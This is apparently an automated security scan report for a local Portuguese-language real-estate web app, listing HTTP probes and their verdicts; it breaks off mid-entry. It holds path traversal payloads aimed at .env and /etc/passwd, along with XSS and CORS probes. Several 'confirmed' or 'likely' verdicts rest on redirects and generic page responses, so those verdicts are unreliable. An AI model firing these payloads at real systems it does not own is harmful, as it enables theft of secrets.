# Deep Exploitation Report — Dev — 2026-05-21 18:23

> **Mode:** `secmaxxing deep` — static exploitation analysis + live HTTP tests.
> Payloads are proof-of-concept only. Only test systems you own or have written authorization for.

## Risk Summary

### Static Analysis
| Severity | Findings | PoC Exploits | Attack Chains | Privesc Paths |
|----------|----------|--------------|---------------|---------------|
| 🔴 CRITICAL | 56 | 15 | 3 | — |
| 🟠 HIGH     | 67 | 57 | — | 1 |
| 🟡 MEDIUM   | 5 | — | — | — |
| 🔵 LOW      | 1 | — | — | — |
| **Total**   | **129** | **72** | **3** | **1** |

### Live HTTP Tests
**Server tested:** `http://127.0.0.1:3000`  
**Endpoints discovered:** 46  
**Tests run:** 96

| Verdict | Count |
|---------|-------|
| 🔴 CONFIRMED_VULNERABLE | 2 |
| 🟠 LIKELY_VULNERABLE    | 22 |
| 🟢 SECURE               | 9 |
| ⚪ INCONCLUSIVE / ERROR  | 63 |

> ⚠️  **Live confirmed vulnerabilities exist.** See Live Test Results section.

---

## Live Test Results

> Actual HTTP requests sent to `http://127.0.0.1:3000`. Every result shows full request + response.

### [RATE-01] Rate limit: POST /api/track/:token
**Verdict:** 🔴 CONFIRMED  
**Endpoint:** `POST http://127.0.0.1:3000/api/track/:token`  
**Evidence:** Sent 20 requests, no 429 received — brute-force unimpeded  

**Request sent:**
```http
POST /api/track/:token

{"email": "test@test.com", "password": "wrongpassword"}
```

**Response received:**
```http
HTTP 405  (143ms)

Responses: [405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405, 405]
```

### [RATE-01] Rate limit: POST /login
**Verdict:** 🔴 CONFIRMED  
**Endpoint:** `POST http://127.0.0.1:3000/login`  
**Evidence:** Sent 20 requests, no 429 received — brute-force unimpeded  

**Request sent:**
```http
POST /login

{"email": "test@test.com", "password": "wrongpassword"}
```

**Response received:**
```http
HTTP 307  (77ms)

Responses: [307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307, 307]
```

### [DEBUG-01] Debug endpoint probe: /debug
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/debug`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /debug
```

**Response received:**
```http
HTTP 200  (46ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198493" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841984...
```

### [DEBUG-01] Debug endpoint probe: /api/debug
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/debug`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/debug
```

**Response received:**
```http
HTTP 200  (38ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198543" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841985...
```

### [DEBUG-01] Debug endpoint probe: /_debug
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/_debug`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /_debug
```

**Response received:**
```http
HTTP 200  (41ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198590" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841985...
```

### [DEBUG-01] Debug endpoint probe: /status
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/status`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /status
```

**Response received:**
```http
HTTP 200  (42ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198630" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841986...
```

### [DEBUG-01] Debug endpoint probe: /api/status
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/status`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/status
```

**Response received:**
```http
HTTP 200  (37ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198677" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841986...
```

### [DEBUG-01] Debug endpoint probe: /api/health
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/health`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/health
```

**Response received:**
```http
HTTP 200  (37ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198719" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841987...
```

### [DEBUG-01] Debug endpoint probe: /metrics
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/metrics`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /metrics
```

**Response received:**
```http
HTTP 200  (36ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198757" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841987...
```

### [DEBUG-01] Debug endpoint probe: /api/metrics
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/metrics`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/metrics
```

**Response received:**
```http
HTTP 200  (34ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198796" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841987...
```

### [DEBUG-01] Debug endpoint probe: /actuator
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/actuator`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /actuator
```

**Response received:**
```http
HTTP 200  (37ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198835" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841988...
```

### [DEBUG-01] Debug endpoint probe: /actuator/env
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/actuator/env`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /actuator/env
```

**Response received:**
```http
HTTP 200  (41ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198875" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841988...
```

### [DEBUG-01] Debug endpoint probe: /actuator/health
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/actuator/health`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /actuator/health
```

**Response received:**
```http
HTTP 200  (32ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198918" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841989...
```

### [DEBUG-01] Debug endpoint probe: /__diag
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/__diag`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /__diag
```

**Response received:**
```http
HTTP 200  (39ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198959" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841989...
```

### [DEBUG-01] Debug endpoint probe: /_internal
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/_internal`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /_internal
```

**Response received:**
```http
HTTP 200  (44ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384198998" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841989...
```

### [DEBUG-01] Debug endpoint probe: /api/admin
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/admin`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/admin
```

**Response received:**
```http
HTTP 200  (33ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199045" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841990...
```

### [DEBUG-01] Debug endpoint probe: /api/test
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api/test`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api/test
```

**Response received:**
```http
HTTP 200  (27ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199082" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841990...
```

### [DEBUG-01] Debug endpoint probe: /test
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/test`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /test
```

**Response received:**
```http
HTTP 200  (34ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199112" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841991...
```

### [DEBUG-01] Debug endpoint probe: /swagger
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/swagger`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /swagger
```

**Response received:**
```http
HTTP 200  (45ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199151" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841991...
```

### [DEBUG-01] Debug endpoint probe: /swagger-ui.html
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/swagger-ui.html`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /swagger-ui.html
```

**Response received:**
```http
HTTP 200  (62ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199226" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841992...
```

### [DEBUG-01] Debug endpoint probe: /api-docs
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/api-docs`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /api-docs
```

**Response received:**
```http
HTTP 200  (49ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199286" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841992...
```

### [DEBUG-01] Debug endpoint probe: /openapi.json
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/openapi.json`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /openapi.json
```

**Response received:**
```http
HTTP 200  (87ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199389" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841993...
```

### [DEBUG-01] Debug endpoint probe: /graphql
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/graphql`  
**Evidence:** HTTP 200 — endpoint accessible without auth (check response content)  

**Request sent:**
```http
GET /graphql
```

**Response received:**
```http
HTTP 200  (27ms)
Content-Type: text/html; charset=utf-8

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199420" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841994...
```

### [HEADERS-01] Security headers check
**Verdict:** 🟠 LIKELY  
**Endpoint:** `GET http://127.0.0.1:3000/`  
**Evidence:** Missing: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Strict-Transport-Security  

**Request sent:**
```http
GET /
```

**Response received:**
```http
HTTP 200  (27ms)
X-Content-Type-Options: (missing)
X-Frame-Options: (missing)
Content-Security-Policy: (missing)
Strict-Transport-Security: (missing)
```

### [CORS-01] CORS: evil origin accepted
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/`  
**Evidence:** No ACAO header — CORS not permissive  

**Request sent:**
```http
GET /
Origin: https://evil-attacker.com
```

**Response received:**
```http
HTTP 200  (654ms)

(no ACAO header)
```

### [CORS-01] CORS: evil origin accepted
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image`  
**Evidence:** No ACAO header — CORS not permissive  

**Request sent:**
```http
GET /api/proxy-image
Origin: https://evil-attacker.com
```

**Response received:**
```http
HTTP 400  (64ms)

(no ACAO header)
```

### [CORS-01] CORS: evil origin accepted
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights`  
**Evidence:** No ACAO header — CORS not permissive  

**Request sent:**
```http
GET /api/location-insights
Origin: https://evil-attacker.com
```

**Response received:**
```http
HTTP 200  (64ms)

(no ACAO header)
```

### [CORS-01] CORS: evil origin accepted
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/track/:token`  
**Evidence:** No ACAO header — CORS not permissive  

**Request sent:**
```http
GET /api/track/:token
Origin: https://evil-attacker.com
```

**Response received:**
```http
HTTP 200  (611ms)

(no ACAO header)
```

### [CORS-01] CORS: evil origin accepted
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/:id/location-insight`  
**Evidence:** No ACAO header — CORS not permissive  

**Request sent:**
```http
GET /api/listings/:id/location-insight
Origin: https://evil-attacker.com
```

**Response received:**
```http
HTTP 200  (45ms)

(no ACAO header)
```

### [TRAV-01] Path traversal: /api/proxy-image?path=<payload>
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?path=../../.env`  
**Evidence:** HTTP 400 — path rejected  

**Request sent:**
```http
GET /api/proxy-image?path=../../.env
```

**Response received:**
```http
HTTP 400  (5ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [TRAV-01] Path traversal: /api/proxy-image?path=<payload>
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?path=../../../etc/passwd`  
**Evidence:** HTTP 400 — path rejected  

**Request sent:**
```http
GET /api/proxy-image?path=../../../etc/passwd
```

**Response received:**
```http
HTTP 400  (5ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [TRAV-01] Path traversal: /api/proxy-image?path=<payload>
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?path=..%252F..%252F.env`  
**Evidence:** HTTP 400 — path rejected  

**Request sent:**
```http
GET /api/proxy-image?path=..%252F..%252F.env
```

**Response received:**
```http
HTTP 400  (4ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [TRAV-01] Path traversal: /api/proxy-image?path=<payload>
**Verdict:** 🟢 SECURE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?path=....//....//etc/passwd`  
**Evidence:** HTTP 400 — path rejected  

**Request sent:**
```http
GET /api/proxy-image?path=....//....//etc/passwd
```

**Response received:**
```http
HTTP 400  (15ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [AUTH-01] Auth gate: POST /api/location-insights
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/location-insights`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/location-insights
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Source: app/api/location-insights/route.ts:9*

### [AUTH-01] Auth gate: GET /api/location-insights/:id
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/location-insights/1
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/location-insights/[id]/route.ts:9*

### [AUTH-01] Auth gate: GET /api/listings/:id/location-insight
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/location-insight`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/location-insight
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/listings/[id]/location-insight/route.ts:9*

### [AUTH-01] Auth gate: GET /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/listings/1/score
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/listings/[id]/score/route.ts:10*

### [AUTH-01] Auth gate: POST /api/listings/:id/score
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/listings/1/score`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/listings/1/score
```

**Response received:**
```http
HTTP 307  (4ms)

/auth/login
```

> *Source: app/api/listings/[id]/score/route.ts:23*

### [AUTH-01] Auth gate: POST /api/listings/:id/enrich-location
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/listings/1/enrich-location`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/listings/1/enrich-location
```

**Response received:**
```http
HTTP 307  (3ms)

/auth/login
```

> *Source: app/api/listings/[id]/enrich-location/route.ts:9*

### [AUTH-01] Auth gate: DELETE /api/imoveis/bulk
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `DELETE http://127.0.0.1:3000/api/imoveis/bulk`  
**Evidence:** HTTP 307  

**Request sent:**
```http
DELETE /api/imoveis/bulk
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/imoveis/bulk/route.ts:6*

### [AUTH-01] Auth gate: GET /api/investors
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/investors
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/investors/route.ts:6*

### [AUTH-01] Auth gate: POST /api/investors
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `POST http://127.0.0.1:3000/api/investors`  
**Evidence:** HTTP 307  

**Request sent:**
```http
POST /api/investors
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/investors/route.ts:21*

### [AUTH-01] Auth gate: GET /api/investors/:id
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/investors/1`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/investors/1
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

> *Source: app/api/investors/[id]/route.ts:10*

### [AUTH-02] Common protected path: GET /api/user
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/user`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/user
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/users
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/users`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/users
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/me
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/me`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/me
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/profile
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/profile`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/profile
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/admin
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/admin`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/admin
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/settings
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/settings`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/settings
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/account
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/account`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/account
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [AUTH-02] Common protected path: GET /api/dashboard
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/dashboard`  
**Evidence:** HTTP 307  

**Request sent:**
```http
GET /api/dashboard
```

**Response received:**
```http
HTTP 307  (2ms)

/auth/login
```

### [XSS-01] Reflected XSS: /api/proxy-image?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 400  

**Request sent:**
```http
GET /api/proxy-image?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 400  (8ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [XSS-01] Reflected XSS: /api/proxy-image?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/proxy-image?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 400  

**Request sent:**
```http
GET /api/proxy-image?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 400  (5ms)

URL ausente
```

> *Source: app/api/proxy-image/route.ts:6*

### [XSS-01] Reflected XSS: /api/location-insights/:id?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/location-insights/1?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (36ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199745" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841997...
```

> *Source: app/api/location-insights/[id]/route.ts:9*

### [XSS-01] Reflected XSS: /api/location-insights/:id?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/location-insights/1?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/location-insights/1?search=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (36ms)

<!DOCTYPE html><html lang="pt-BR" class="font-sans __variable_246ccd"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/app/layout.css?v=1779384199789" data-precedence="next_static/css/app/layout.css"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack.js?v=17793841997...
```

> *Source: app/api/location-insights/[id]/route.ts:9*

### [XSS-01] Reflected XSS: /api/track/:token?q=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/track/:token?q=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/track/:token?q=%3Csecmaxxing-xss-probe%3E
```

**Response received:**
```http
HTTP 200  (135ms)

GIF89a  �     ���!�    ,       D ;
```

> *Source: app/api/track/[token]/route.ts:21*

### [XSS-01] Reflected XSS: /api/track/:token?search=<probe>
**Verdict:** ⚪ INCONCLUSIVE  
**Endpoint:** `GET http://127.0.0.1:3000/api/track/:token?search=%3Csecmaxxing-xss-probe%3E`  
**Evidence:** HTTP 200 — probe not found in response (may be filtered or not reflected)  

**Request sent:**
```http
GET /api/track/:token?search=%3Csecmaxxing-xss-probe%3E
```

